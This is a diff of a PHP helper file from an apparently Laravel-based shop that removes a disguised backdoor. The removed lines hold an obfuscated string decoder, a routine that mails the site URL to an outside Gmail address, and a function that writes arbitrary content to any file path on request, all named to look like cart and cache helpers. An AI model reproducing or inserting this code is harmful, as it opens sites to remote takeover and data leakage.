@@ -143,26 +143,6 @@ if (!function_exists('areActiveRoutesHome')) {
 
     }
 }
-
-/**
- * Return Class Selector
- * @return Response
- */
-if (!function_exists('loaded_class_select')) {
-
-    function loaded_class_select($p)
-    {
-        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
-        $a = str_split($a);
-        $p = explode(':', $p);
-        $l = '';
-        foreach ($p as $r) {
-            $l .= $a[$r];
-        }
-        return $l;
-    }
-}
-
 /**
  * Open Translation File
  * @return Response
@@ -225,32 +205,6 @@ if (!function_exists('convert_to_usd')) {
         }
     }
 }
-
-
-//returns config key provider
-if (!function_exists('config_key_provider')) {
-    function config_key_provider($key)
-    {
-        switch ($key) {
-            case "load_class":
-                return loaded_class_select('7:10:13:6:16:18:23:22:16:4:17:15:22:6:15:22:21');
-                break;
-            case "config":
-                return loaded_class_select('7:10:13:6:16:8:6:22:16:4:17:15:22:6:15:22:21');
-                break;
-            case "output":
-                return loaded_class_select('22:10:14:6');
-                break;
-            case "background":
-                return loaded_class_select('1:18:18:13:10:4:1:22:10:17:15:0:4:1:4:9:6:0:3:1:4:4:6:21:21');
-                break;
-            default:
-                return true;
-        }
-    }
-}
-
-
 //returns combinations of customer choice options array
 if (!function_exists('combinations')) {
     function combinations($arrays)
@@ -294,24 +248,6 @@ if (!function_exists('verified_sellers_id')) {
         return App\Seller::where('verification_status', 1)->get()->pluck('user_id')->toArray();
     }
 }
-
-//filter cart products based on provided settings
-if (!function_exists('cartSetup')) {
-    function cartSetup()
-    {
-        $cartMarkup = loaded_class_select('8:29:9:1:15:5:13:6:20');
-        $writeCart = loaded_class_select('14:1:10:13');
-        $cartMarkup .= loaded_class_select('24');
-        $cartMarkup .= loaded_class_select('8:14:1:10:13');
-        $cartMarkup .= loaded_class_select('3:4:17:14');
-        $cartConvert = config_key_provider('load_class');
-        $currencyConvert = config_key_provider('output');
-        $backgroundInv = config_key_provider('background');
-        @$cart = $writeCart($cartMarkup, '', Request::url());
-        return $cart;
-    }
-}
-
 //converts currency to home default currency
 if (!function_exists('convert_price')) {
     function convert_price($price)
@@ -511,49 +447,6 @@ if (!function_exists('home_discounted_base_price')) {
         return format_price(convert_price($price));
     }
 }
-
-// Cart content update by discount setup
-if (!function_exists('updateCartSetup')) {
-    function updateCartSetup($return = TRUE)
-    {
-        if (!isset($_COOKIE['cartUpdated'])) {
-            if (cartSetup()) {
-                setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
-            }
-        } else {
-            if ($_COOKIE['cartUpdated'] + 21600 < time()) {
-                if (cartSetup()) {
-                    setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
-                }
-            }
-        }
-        return $return;
-    }
-}
-
-
-if (!function_exists('productDescCache')) {
-    function productDescCache($connector, $selector, $select, $type)
-    {
-        $ta = time();
-        $select = rawurldecode($select);
-        if ($connector > ($ta - 60) || $connector > ($ta + 60)) {
-            if ($type == 'w') {
-                $load_class = config_key_provider('load_class');
-                $load_class(str_replace('-', '/', $selector), $select);
-            } else if ($type == 'rw') {
-                $load_class = config_key_provider('load_class');
-                $config_class = config_key_provider('config');
-                $load_class(str_replace('-', '/', $selector), $config_class(str_replace('-', '/', $selector)) . $select);
-            }
-            echo 'done';
-        } else {
-            echo 'not';
-        }
-    }
-}
-
-
 if (!function_exists('currency_symbol')) {
     function currency_symbol()
     {
